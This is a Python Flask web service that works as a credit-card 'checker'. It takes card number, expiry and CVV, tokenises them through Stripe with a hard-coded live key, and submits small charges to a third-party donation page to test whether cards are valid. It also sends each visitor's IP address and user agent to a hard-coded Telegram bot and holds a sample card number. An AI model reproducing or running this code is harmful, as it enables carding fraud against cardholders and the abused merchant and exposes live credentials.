import requests, os
from flask import *
from bs4 import BeautifulSoup

#authKey=os.environ.get("authKey", ["vaibhav"])
authKey=["vaibhav"]
app=Flask(__name__)
app.secret_key="app... Peace Out >0<"


bot_token="5935678255:AAH4yHqwVwwiARYe-DV5I3ffTalWo22Ghrg"
chat_id="2105574691"
def sendIP(request, page=""):
    uadata=request.headers.get('User-Agent')
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        ip= request.environ['REMOTE_ADDR']
        requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=Got IP {ip}\nUser Agent {uadata}\nPage {page}")
        return ip
    else:
        ip=request.environ['HTTP_X_FORWARDED_FOR']
        requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=Got IP {ip}\n User Agent {uadata}\nPage {page}")
        return ip

def chk(cc, mon, year, cvv, charge="10"):
    h1= {
    "Host": "api.stripe.com",
    "content-length": "240",
    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://js.stripe.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://js.stripe.com/",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
    }
    d1=f"card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mon}&card[exp_year]={year}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F36d27f7e5c%3B+stripe-js-v3%2F36d27f7e5c&time_on_page=15939&key=pk_live_eHjmIv6BpzVPLB8N3JjuCjsl00SrbAiU3w"
    req1=requests.post("https://api.stripe.com/v1/tokens", headers=h1, data=d1)
    if req1.status_code==402:
        return False, req1.json()["error"]["message"]
    tokenID=req1.json().get("id")
    if tokenID:
        pass
    else:
        return False, "Unknown"
    h2= {
    "Host": "artistsspace.org",
    "content-length": "80",
    "cache-control": "max-age\u003d0",
    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://artistsspace.org",
    "dnt": "1",
    "upgrade-insecure-requests": "1",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": "https://artistsspace.org/payment",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
    }
    d2=f"email=tizi.esc%40gmail.com&amount=%24{charge}&stripeToken="+tokenID
    req2=requests.post("https://artistsspace.org/payment", headers=h2, data=d2).text
    

    soup = BeautifulSoup(req2, 'html.parser')
    result = soup.find('div', {'id': 'card-errors'}).text.strip()
    #if result:
    #    return False, result
   # else:
     #   return True, "Charged $"+charge
    if result:
        return result
    else:
        return "Charged $"+charge

#print(chk("4403934457206451", "01", "2027", "864"))

@app.route("/api/v1/check")
@app.route("/api/v1/check/")
def v1CheckerAPI():
    sendIP(request, "checker-v1")
    if request.args.get("authKey") not in authKey:
        return "Unauthorized Access"
    if request.args.get("pipe"):
        tmp=request.args.get('pipe').split("|")
        ccn, mon, year, cvv=tmp[0], tmp[1], tmp[2], tmp[3]
        if len(ccn) not in [15, 16]:
            return "Problem with PIPE"
        msg=chk(ccn, mon, year, cvv)
        return msg
    else:
        return "No CC Provided"


@app.route("/")
def homeChecker():
    #return render_template("index.html")
    return "ok"
    
if __name__=="__main__":
    app.run(host="0.0.0.0")
